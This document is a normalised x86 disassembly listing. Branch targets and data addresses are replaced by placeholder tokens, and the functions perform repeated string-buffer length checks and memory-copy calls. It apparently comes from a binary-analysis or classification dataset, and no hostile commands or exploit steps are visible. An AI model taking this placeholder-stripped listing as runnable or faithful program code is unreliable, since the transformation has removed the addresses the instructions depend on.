lea edx [ ebp - 0x108 ]
push edx
call sub_4bc8cc
pop ecx
lea ecx [ ebp - 0xf8 ]
mov ecx [ ebp - 0xf8 ]
jmp r-xdata
lea ecx [ ebp - 0x80 ]
cmp ecx edi
jne r-xdata
mov [ ebp - 0x378 ] 0xffffffff
mov [ edi + 0x20 ] ebx
add ecx ebx
mov [ ebp - 0x364 ] ecx
mov eax [ ebp - 0x364 ]
mov dl [ ebp - 0x35d ]
mov [ eax ] dl
test esi esi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x315 ] 0x0
cmp [ edi + 0x24 ] 0x10
jb r-xdata
mov edx [ edi + 0x20 ]
cmp edx [ ebp - 0x2dc ]
jae r-xdata
push edi
call sub_4bc8cc
pop ecx
lea ecx [ edi + 0x10 ]
mov ecx [ edi + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x208 ]
mov [ ebp - 0x250 ] eax
lea edx [ ebp - 0x20 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x254 ] eax
cmp [ ebp - 0x254 ] 0x1
ja r-xdata
mov [ ebp - 0x20c ] 0xffffffff
mov eax [ ebp - 0x208 ]
mov [ ebp - 0x210 ] eax
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0x210 ]
jae r-xdata
mov eax esi
jmp r-xdata
mov edx [ ebp - 0x144 ]
mov [ ebp - 0x1b0 ] edx
cmp [ esi + 0x24 ] 0x10
jb r-xdata
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x16c ] 0x0
jbe r-xdata
mov ecx [ esi + 0x20 ]
mov [ ebp - 0x16c ] ecx
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x14c ]
add ecx [ ebp - 0x148 ]
mov [ ebp - 0x154 ] ecx
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0x4f0 ]
mov [ ebp - 0x538 ] eax
lea edx [ ebp - 0xd0 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x53c ] eax
cmp [ ebp - 0x53c ] 0x1
ja r-xdata
mov [ ebp - 0x4f4 ] 0xffffffff
mov edx [ ebp - 0x4f0 ]
mov [ ebp - 0x4f8 ] edx
mov ecx [ ebp - 0xb8 ]
cmp ecx [ ebp - 0x4f8 ]
jae r-xdata
lea eax [ ebp - 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x428 ]
mov [ ebp - 0x498 ] edx
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
lea eax [ ebp - 0xf8 ]
mov eax [ ebp - 0xf8 ]
jmp r-xdata
cmp [ ebp - 0x450 ] 0x0
jbe r-xdata
mov eax [ ebp - 0xe8 ]
mov [ ebp - 0x450 ] eax
lea eax [ ebp - 0xf8 ]
mov eax [ ebp - 0xf8 ]
jmp r-xdata
add ecx [ ebp - 0x430 ]
add ecx [ ebp - 0x42c ]
mov [ ebp - 0x438 ] ecx
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
mov eax [ ebp - 0x378 ]
mov [ ebp - 0x3c0 ] eax
lea edx [ ebp - 0x78 ]
push edx
call sub_408880
pop ecx
mov [ ebp - 0x3c4 ] eax
cmp [ ebp - 0x3c4 ] 0x1
ja r-xdata
mov [ ebp - 0x37c ] 0xffffffff
mov eax [ ebp - 0x378 ]
mov [ ebp - 0x380 ] eax
mov edx [ ebp - 0x60 ]
cmp edx [ ebp - 0x380 ]
jae r-xdata
mov eax edi
jmp r-xdata
mov edx [ ebp - 0x2b4 ]
mov [ ebp - 0x320 ] edx
cmp [ edi + 0x24 ] 0x10
jb r-xdata
lea eax [ edi + 0x10 ]
mov eax [ edi + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x2dc ] 0x0
jbe r-xdata
mov ecx [ edi + 0x20 ]
mov [ ebp - 0x2dc ] ecx
lea eax [ edi + 0x10 ]
mov eax [ edi + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x2bc ]
add ecx [ ebp - 0x2b8 ]
mov [ ebp - 0x2c4 ] ecx
cmp [ edi + 0x24 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x254 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x210 ]
cmp eax [ ebp - 0x20c ]
jae r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
call sub_4bc8cc
pop ecx
inc [ ebp - 0x110 ]
lea edx [ ebp - 0x30 ]
push edx
call sub_4088ac
pop ecx
inc [ ebp - 0x110 ]
mov ecx rw-data
mov [ ebp - 0x30 ] ecx
lea eax [ esi + 0x8 ]
push eax
lea edx [ ebp - 0x1fc ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x1fc ]
push ecx
lea eax [ ebp - 0x20 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1fd ] 0x0
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
lea ecx [ esi + 0x10 ]
mov ecx [ esi + 0x10 ]
jmp r-xdata
xor edx edx
mov [ esi + 0x20 ] edx
add eax edx
mov [ ebp - 0x1ac ] eax
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x1a5 ]
mov [ eax ] cl
mov eax [ esi + 0x20 ]
sub eax [ ebp - 0x16c ]
mov [ ebp - 0x170 ] eax
cmp [ esi + 0x24 ] 0x10
jb r-xdata
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
add eax [ ebp - 0x14c ]
mov [ ebp - 0x158 ] eax
mov edx [ ebp - 0x150 ]
push edx
mov ecx [ ebp - 0x154 ]
push ecx
mov eax [ ebp - 0x158 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ esi + 0x20 ]
sub edx [ ebp - 0x148 ]
mov [ ebp - 0x15c ] edx
mov ecx [ ebp - 0x15c ]
mov [ ebp - 0x160 ] ecx
mov [ ebp - 0x161 ] 0x0
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x53c ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov edx [ ebp - 0xb8 ]
sub edx [ ebp - 0x4f8 ]
cmp edx [ ebp - 0x4f4 ]
jae r-xdata
lea eax [ ebp - 0xd8 ]
push eax
call sub_4bc8cc
pop ecx
inc [ ebp - 0x110 ]
lea edx [ ebp - 0xe0 ]
push edx
call sub_4088ac
pop ecx
inc [ ebp - 0x110 ]
mov ecx rw-data
mov [ ebp - 0xe0 ] ecx
lea eax [ ebp - 0x100 ]
push eax
lea edx [ ebp - 0x4e4 ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x4e4 ]
push ecx
lea eax [ ebp - 0xd0 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0xb4 ] edx
mov [ ebp - 0x4e5 ] 0x0
cmp [ ebp - 0xb4 ] 0x10
jb r-xdata
lea ecx [ ebp - 0xf8 ]
mov ecx [ ebp - 0xf8 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0xe8 ] edx
add eax edx
mov [ ebp - 0x494 ] eax
mov eax [ ebp - 0x494 ]
mov cl [ ebp - 0x48d ]
mov [ eax ] cl
mov edx [ ebp - 0xe8 ]
sub edx [ ebp - 0x450 ]
mov [ ebp - 0x454 ] edx
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
lea eax [ ebp - 0xf8 ]
mov eax [ ebp - 0xf8 ]
jmp r-xdata
add eax [ ebp - 0x430 ]
mov [ ebp - 0x43c ] eax
mov edx [ ebp - 0x434 ]
push edx
mov ecx [ ebp - 0x438 ]
push ecx
mov eax [ ebp - 0x43c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0xe8 ]
sub edx [ ebp - 0x42c ]
mov [ ebp - 0x440 ] edx
mov ecx [ ebp - 0x440 ]
mov [ ebp - 0x444 ] ecx
mov [ ebp - 0x445 ] 0x0
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x3c4 ]
dec ecx
mov ecx 0x1
jmp r-xdata
mov eax [ ebp - 0x60 ]
sub eax [ ebp - 0x380 ]
cmp eax [ ebp - 0x37c ]
jae r-xdata
lea ecx [ ebp - 0x80 ]
push ecx
call sub_4bc8cc
pop ecx
inc [ ebp - 0x110 ]
lea edx [ ebp - 0x88 ]
push edx
call sub_4088ac
pop ecx
inc [ ebp - 0x110 ]
mov ecx rw-data
mov [ ebp - 0x88 ] ecx
lea eax [ edi + 0x8 ]
push eax
lea edx [ ebp - 0x36c ]
push edx
call sub_408650
add esp 0x8
lea ecx [ ebp - 0x36c ]
push ecx
lea eax [ ebp - 0x78 ]
push eax
call sub_408650
add esp 0x8
mov edx 0xf
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x36d ] 0x0
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
lea ecx [ edi + 0x10 ]
mov ecx [ edi + 0x10 ]
jmp r-xdata
xor edx edx
mov [ edi + 0x20 ] edx
add eax edx
mov [ ebp - 0x31c ] eax
mov eax [ ebp - 0x31c ]
mov cl [ ebp - 0x315 ]
mov [ eax ] cl
mov eax [ edi + 0x20 ]
sub eax [ ebp - 0x2dc ]
mov [ ebp - 0x2e0 ] eax
cmp [ edi + 0x24 ] 0x10
jb r-xdata
lea eax [ edi + 0x10 ]
mov eax [ edi + 0x10 ]
jmp r-xdata
add eax [ ebp - 0x2bc ]
mov [ ebp - 0x2c8 ] eax
mov edx [ ebp - 0x2c0 ]
push edx
mov ecx [ ebp - 0x2c4 ]
push ecx
mov eax [ ebp - 0x2c8 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ edi + 0x20 ]
sub edx [ ebp - 0x2b8 ]
mov [ ebp - 0x2cc ] edx
mov ecx [ ebp - 0x2cc ]
mov [ ebp - 0x2d0 ] ecx
mov [ ebp - 0x2d1 ] 0x0
cmp [ edi + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x4 ]
cmp edx [ ebp - 0x250 ]
jae r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x250 ]
jae r-xdata
cmp [ ebp - 0x20c ] 0x0
jbe r-xdata
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x210 ]
mov [ ebp - 0x20c ] edx
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x140 ]
mov [ ebp - 0x1b4 ] ecx
cmp [ esi + 0x24 ] 0x10
jb r-xdata
lea edx [ esi + 0x10 ]
mov edx [ esi + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x160 ]
mov [ esi + 0x20 ] edx
add eax edx
mov [ ebp - 0x168 ] eax
mov eax [ ebp - 0x168 ]
mov cl [ ebp - 0x161 ]
mov [ eax ] cl
mov edx [ ebp - 0xb4 ]
cmp edx [ ebp - 0x538 ]
jae r-xdata
lea eax [ ebp - 0xd8 ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x538 ]
jae r-xdata
cmp [ ebp - 0x4f4 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0xb8 ]
sub ecx [ ebp - 0x4f8 ]
mov [ ebp - 0x4f4 ] ecx
lea eax [ ebp - 0xf8 ]
mov eax [ ebp - 0xf8 ]
jmp r-xdata
add ecx [ ebp - 0x424 ]
mov [ ebp - 0x49c ] ecx
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
lea ecx [ ebp - 0xf8 ]
mov ecx [ ebp - 0xf8 ]
jmp r-xdata
mov edx [ ebp - 0x444 ]
mov [ ebp - 0xe8 ] edx
add eax edx
mov [ ebp - 0x44c ] eax
mov eax [ ebp - 0x44c ]
mov cl [ ebp - 0x445 ]
mov [ eax ] cl
mov edx [ ebp - 0x5c ]
cmp edx [ ebp - 0x3c0 ]
jae r-xdata
lea eax [ ebp - 0x80 ]
push eax
call sub_4bbca8
pop ecx
cmp ecx [ ebp - 0x3c0 ]
jae r-xdata
cmp [ ebp - 0x37c ] 0x0
jbe r-xdata
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x380 ]
mov [ ebp - 0x37c ] edx
lea eax [ edi + 0x10 ]
mov eax [ edi + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0x2b0 ]
mov [ ebp - 0x324 ] ecx
cmp [ edi + 0x24 ] 0x10
jb r-xdata
lea edx [ edi + 0x10 ]
mov edx [ edi + 0x10 ]
jmp r-xdata
mov edx [ ebp - 0x2d0 ]
mov [ edi + 0x20 ] edx
add eax edx
mov [ ebp - 0x2d8 ] eax
mov eax [ ebp - 0x2d8 ]
mov cl [ ebp - 0x2d1 ]
mov [ eax ] cl
cmp [ ebp - 0x250 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x250 ]
push edx
lea ecx [ ebp - 0x28 ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x230 ] eax
cmp [ ebp - 0x8 ] 0x0
jae r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x210 ]
sub ecx [ ebp - 0x20c ]
mov [ ebp - 0x214 ] ecx
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
lea ecx [ esi + 0x10 ]
mov ecx [ esi + 0x10 ]
jmp r-xdata
mov [ ebp - 0x1b8 ] eax
mov edx [ ebp - 0x1b0 ]
push edx
mov ecx [ ebp - 0x1b4 ]
push ecx
mov eax [ ebp - 0x1b8 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x144 ]
mov [ ebp - 0x1bc ] edx
mov [ ebp - 0x1bd ] 0x0
cmp [ esi + 0x24 ] 0x10
jb r-xdata
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
add edx [ ebp - 0x16c ]
mov [ ebp - 0x174 ] edx
cmp [ esi + 0x24 ] 0x10
jb r-xdata
cmp [ ebp - 0x538 ] 0x0
jne r-xdata
mov eax [ ebp - 0xb8 ]
push eax
mov edx [ ebp - 0x538 ]
push edx
lea ecx [ ebp - 0xd8 ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x518 ] eax
cmp [ ebp - 0xb8 ] 0x0
jae r-xdata
mov eax [ ebp - 0xb8 ]
sub eax [ ebp - 0x4f8 ]
sub eax [ ebp - 0x4f4 ]
mov [ ebp - 0x4fc ] eax
cmp [ ebp - 0xb4 ] 0x10
jb r-xdata
lea ecx [ ebp - 0xf8 ]
mov ecx [ ebp - 0xf8 ]
jmp r-xdata
mov [ ebp - 0x4a0 ] eax
mov edx [ ebp - 0x498 ]
push edx
mov ecx [ ebp - 0x49c ]
push ecx
mov eax [ ebp - 0x4a0 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x428 ]
mov [ ebp - 0x4a4 ] edx
mov [ ebp - 0x4a5 ] 0x0
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
lea eax [ ebp - 0xf8 ]
mov eax [ ebp - 0xf8 ]
jmp r-xdata
add ecx [ ebp - 0x450 ]
mov [ ebp - 0x458 ] ecx
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
cmp [ ebp - 0x3c0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x60 ]
push eax
mov edx [ ebp - 0x3c0 ]
push edx
lea ecx [ ebp - 0x80 ]
push ecx
call sub_408678
add esp 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x3a0 ] eax
cmp [ ebp - 0x60 ] 0x0
jae r-xdata
mov ecx [ ebp - 0x60 ]
sub ecx [ ebp - 0x380 ]
sub ecx [ ebp - 0x37c ]
mov [ ebp - 0x384 ] ecx
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
lea ecx [ edi + 0x10 ]
mov ecx [ edi + 0x10 ]
jmp r-xdata
mov [ ebp - 0x328 ] eax
mov edx [ ebp - 0x320 ]
push edx
mov ecx [ ebp - 0x324 ]
push ecx
mov eax [ ebp - 0x328 ]
push eax
call sub_4c4cb0
add esp 0xc
mov edx [ ebp - 0x2b4 ]
mov [ ebp - 0x32c ] edx
mov [ ebp - 0x32d ] 0x0
cmp [ edi + 0x24 ] 0x10
jb r-xdata
lea eax [ edi + 0x10 ]
mov eax [ edi + 0x10 ]
jmp r-xdata
add edx [ ebp - 0x2dc ]
mov [ ebp - 0x2e4 ] edx
cmp [ edi + 0x24 ] 0x10
jb r-xdata
cmp [ ebp - 0x250 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x26d ] 0x0
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x230 ]
jae r-xdata
lea edx [ ebp - 0x28 ]
push edx
call sub_4bc8cc
pop ecx
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x1bc ]
mov [ esi + 0x20 ] eax
add ecx eax
mov [ ebp - 0x1c4 ] ecx
mov edx [ ebp - 0x1c4 ]
mov cl [ ebp - 0x1bd ]
mov [ edx ] cl
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
mov [ ebp - 0x178 ] eax
mov edx [ ebp - 0x170 ]
push edx
mov ecx [ ebp - 0x174 ]
push ecx
mov eax [ ebp - 0x178 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ esi + 0x20 ]
sub edx [ ebp - 0x16c ]
mov [ ebp - 0x17c ] edx
mov ecx [ ebp - 0x17c ]
mov [ ebp - 0x180 ] ecx
mov [ ebp - 0x181 ] 0x0
cmp [ esi + 0x24 ] 0x10
jb r-xdata
cmp [ ebp - 0x538 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x555 ] 0x0
cmp [ ebp - 0xb4 ] 0x10
jb r-xdata
mov ecx [ ebp - 0xb8 ]
cmp ecx [ ebp - 0x518 ]
jae r-xdata
lea edx [ ebp - 0xd8 ]
push edx
call sub_4bc8cc
pop ecx
lea edx [ ebp - 0xc8 ]
mov edx [ ebp - 0xc8 ]
jmp r-xdata
mov eax [ ebp - 0x4a4 ]
mov [ ebp - 0xe8 ] eax
add ecx eax
mov [ ebp - 0x4ac ] ecx
mov edx [ ebp - 0x4ac ]
mov cl [ ebp - 0x4a5 ]
mov [ edx ] cl
lea eax [ ebp - 0xf8 ]
mov eax [ ebp - 0xf8 ]
jmp r-xdata
mov [ ebp - 0x45c ] eax
mov edx [ ebp - 0x454 ]
push edx
mov ecx [ ebp - 0x458 ]
push ecx
mov eax [ ebp - 0x45c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0xe8 ]
sub edx [ ebp - 0x450 ]
mov [ ebp - 0x460 ] edx
mov ecx [ ebp - 0x460 ]
mov [ ebp - 0x464 ] ecx
mov [ ebp - 0x465 ] 0x0
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
cmp [ ebp - 0x3c0 ] 0x0
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0x3dd ] 0x0
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
mov ecx [ ebp - 0x60 ]
cmp ecx [ ebp - 0x3a0 ]
jae r-xdata
lea edx [ ebp - 0x80 ]
push edx
call sub_4bc8cc
pop ecx
lea eax [ ebp - 0x70 ]
mov eax [ ebp - 0x70 ]
jmp r-xdata
mov eax [ ebp - 0x32c ]
mov [ edi + 0x20 ] eax
add ecx eax
mov [ ebp - 0x334 ] ecx
mov edx [ ebp - 0x334 ]
mov cl [ ebp - 0x32d ]
mov [ edx ] cl
lea eax [ edi + 0x10 ]
mov eax [ edi + 0x10 ]
jmp r-xdata
mov [ ebp - 0x2e8 ] eax
mov edx [ ebp - 0x2e0 ]
push edx
mov ecx [ ebp - 0x2e4 ]
push ecx
mov eax [ ebp - 0x2e8 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ edi + 0x20 ]
sub edx [ ebp - 0x2dc ]
mov [ ebp - 0x2ec ] edx
mov ecx [ ebp - 0x2ec ]
mov [ ebp - 0x2f0 ] ecx
mov [ ebp - 0x2f1 ] 0x0
cmp [ edi + 0x24 ] 0x10
jb r-xdata
inc [ ebp - 0x110 ]
inc [ ebp - 0x110 ]
mov eax rw-data
mov [ ebp - 0x30 ] eax
inc [ ebp - 0x110 ]
dec [ ebp - 0x110 ]
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x208 ]
mov [ ebp - 0x278 ] edx
cmp [ esi + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
cmp [ ebp - 0x230 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x230 ] eax
lea edx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
jmp r-xdata
add eax [ ebp - 0x210 ]
add eax [ ebp - 0x20c ]
mov [ ebp - 0x218 ] eax
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
mov edx [ ebp - 0x180 ]
mov [ esi + 0x20 ] edx
add eax edx
mov [ ebp - 0x188 ] eax
mov eax [ ebp - 0x188 ]
mov cl [ ebp - 0x181 ]
mov [ eax ] cl
jmp r-xdata
inc [ ebp - 0x110 ]
inc [ ebp - 0x110 ]
mov eax rw-data
mov [ ebp - 0xe0 ] eax
inc [ ebp - 0x110 ]
dec [ ebp - 0x110 ]
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
mov edx [ ebp - 0x4f0 ]
mov [ ebp - 0x560 ] edx
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov eax [ ebp - 0xc8 ]
jmp r-xdata
cmp [ ebp - 0x518 ] 0x0
jbe r-xdata
mov eax [ ebp - 0xb8 ]
mov [ ebp - 0x518 ] eax
lea eax [ ebp - 0xc8 ]
mov eax [ ebp - 0xc8 ]
jmp r-xdata
add edx [ ebp - 0x4f8 ]
add edx [ ebp - 0x4f4 ]
mov [ ebp - 0x500 ] edx
cmp [ ebp - 0xb4 ] 0x10
jb r-xdata
mov edx [ ebp - 0x464 ]
mov [ ebp - 0xe8 ] edx
add eax edx
mov [ ebp - 0x46c ] eax
mov eax [ ebp - 0x46c ]
mov cl [ ebp - 0x465 ]
mov [ eax ] cl
jmp r-xdata
inc [ ebp - 0x110 ]
inc [ ebp - 0x110 ]
mov eax rw-data
mov [ ebp - 0x88 ] eax
inc [ ebp - 0x110 ]
dec [ ebp - 0x110 ]
cmp [ edi + 0x24 ] 0x10
jb r-xdata
mov edx [ ebp - 0x378 ]
mov [ ebp - 0x3e8 ] edx
cmp [ edi + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x70 ]
mov eax [ ebp - 0x70 ]
jmp r-xdata
cmp [ ebp - 0x3a0 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x3a0 ] eax
lea edx [ ebp - 0x70 ]
mov edx [ ebp - 0x70 ]
jmp r-xdata
add eax [ ebp - 0x380 ]
add eax [ ebp - 0x37c ]
mov [ ebp - 0x388 ] eax
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
mov edx [ ebp - 0x2f0 ]
mov [ edi + 0x20 ] edx
add eax edx
mov [ ebp - 0x2f8 ] eax
mov eax [ ebp - 0x2f8 ]
mov cl [ ebp - 0x2f1 ]
mov [ eax ] cl
jmp r-xdata
mov edx 0xf
mov [ esi + 0x24 ] edx
mov [ ebp - 0x295 ] 0x0
cmp [ esi + 0x24 ] 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
mov [ ebp - 0x290 ] edx
mov ecx [ ebp - 0x290 ]
mov [ ebp - 0x294 ] ecx
mov eax [ ebp - 0x294 ]
push eax
call sub_4b0180
pop ecx
lea ecx [ esi + 0x10 ]
mov ecx [ esi + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x274 ] eax
mov eax [ ebp - 0x274 ]
mov cl [ ebp - 0x26d ]
mov [ eax ] cl
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x230 ]
mov [ ebp - 0x234 ] edx
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
add edx [ ebp - 0x210 ]
mov [ ebp - 0x21c ] edx
mov eax [ ebp - 0x214 ]
push eax
mov ecx [ ebp - 0x218 ]
push ecx
mov eax [ ebp - 0x21c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x20c ]
mov [ ebp - 0x220 ] edx
mov ecx [ ebp - 0x220 ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x225 ] 0x0
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
mov edx 0xf
mov [ ebp - 0xe4 ] edx
mov [ ebp - 0x57d ] 0x0
cmp [ ebp - 0xe4 ] 0x10
jb r-xdata
mov edx [ ebp - 0xf8 ]
mov [ ebp - 0x578 ] edx
mov ecx [ ebp - 0x578 ]
mov [ ebp - 0x57c ] ecx
mov eax [ ebp - 0x57c ]
push eax
call sub_4b0180
pop ecx
lea ecx [ ebp - 0xf8 ]
mov ecx [ ebp - 0xf8 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0xb8 ] edx
add eax edx
mov [ ebp - 0x55c ] eax
mov eax [ ebp - 0x55c ]
mov cl [ ebp - 0x555 ]
mov [ eax ] cl
mov edx [ ebp - 0xb8 ]
sub edx [ ebp - 0x518 ]
mov [ ebp - 0x51c ] edx
cmp [ ebp - 0xb4 ] 0x10
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov eax [ ebp - 0xc8 ]
jmp r-xdata
add eax [ ebp - 0x4f8 ]
mov [ ebp - 0x504 ] eax
mov edx [ ebp - 0x4fc ]
push edx
mov ecx [ ebp - 0x500 ]
push ecx
mov eax [ ebp - 0x504 ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0xb8 ]
sub edx [ ebp - 0x4f4 ]
mov [ ebp - 0x508 ] edx
mov ecx [ ebp - 0x508 ]
mov [ ebp - 0x50c ] ecx
mov [ ebp - 0x50d ] 0x0
cmp [ ebp - 0xb4 ] 0x10
jb r-xdata
mov edx 0xf
mov [ edi + 0x24 ] edx
mov [ ebp - 0x405 ] 0x0
cmp [ edi + 0x24 ] 0x10
jb r-xdata
mov edx [ edi + 0x10 ]
mov [ ebp - 0x400 ] edx
mov ecx [ ebp - 0x400 ]
mov [ ebp - 0x404 ] ecx
mov eax [ ebp - 0x404 ]
push eax
call sub_4b0180
pop ecx
lea ecx [ edi + 0x10 ]
mov ecx [ edi + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebp - 0x60 ] edx
add eax edx
mov [ ebp - 0x3e4 ] eax
mov eax [ ebp - 0x3e4 ]
mov cl [ ebp - 0x3dd ]
mov [ eax ] cl
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] edx
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
lea eax [ ebp - 0x70 ]
mov eax [ ebp - 0x70 ]
jmp r-xdata
add edx [ ebp - 0x380 ]
mov [ ebp - 0x38c ] edx
mov eax [ ebp - 0x384 ]
push eax
mov ecx [ ebp - 0x388 ]
push ecx
mov eax [ ebp - 0x38c ]
push eax
call sub_4c4cf8
add esp 0xc
mov edx [ ebp - 0x60 ]
sub edx [ ebp - 0x37c ]
mov [ ebp - 0x390 ] edx
mov ecx [ ebp - 0x390 ]
mov [ ebp - 0x394 ] ecx
mov [ ebp - 0x395 ] 0x0
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
lea ecx [ esi + 0x10 ]
mov ecx [ esi + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov [ ebp - 0x27c ] ecx
cmp [ ebp - 0x4 ] 0x10
jb r-xdata
lea ecx [ ebp - 0x18 ]
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov edx [ ebp - 0x224 ]
mov [ ebp - 0x8 ] edx
add eax edx
mov [ ebp - 0x22c ] eax
mov eax [ ebp - 0x22c ]
mov cl [ ebp - 0x225 ]
mov [ eax ] cl
lea ecx [ ebp - 0xf8 ]
mov ecx [ ebp - 0xf8 ]
jmp r-xdata
lea eax [ ebp - 0xc8 ]
mov eax [ ebp - 0xc8 ]
jmp r-xdata
mov [ ebp - 0x564 ] ecx
cmp [ ebp - 0xb4 ] 0x10
jb r-xdata
lea ecx [ ebp - 0xc8 ]
mov ecx [ ebp - 0xc8 ]
jmp r-xdata
mov edx [ ebp - 0x50c ]
mov [ ebp - 0xb8 ] edx
add eax edx
mov [ ebp - 0x514 ] eax
mov eax [ ebp - 0x514 ]
mov cl [ ebp - 0x50d ]
mov [ eax ] cl
lea ecx [ edi + 0x10 ]
mov ecx [ edi + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x70 ]
mov eax [ ebp - 0x70 ]
jmp r-xdata
mov [ ebp - 0x3ec ] ecx
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
lea ecx [ ebp - 0x70 ]
mov ecx [ ebp - 0x70 ]
jmp r-xdata
mov edx [ ebp - 0x394 ]
mov [ ebp - 0x60 ] edx
add eax edx
mov [ ebp - 0x39c ] eax
mov eax [ ebp - 0x39c ]
mov cl [ ebp - 0x395 ]
mov [ eax ] cl
xor eax eax
mov [ esi + 0x20 ] eax
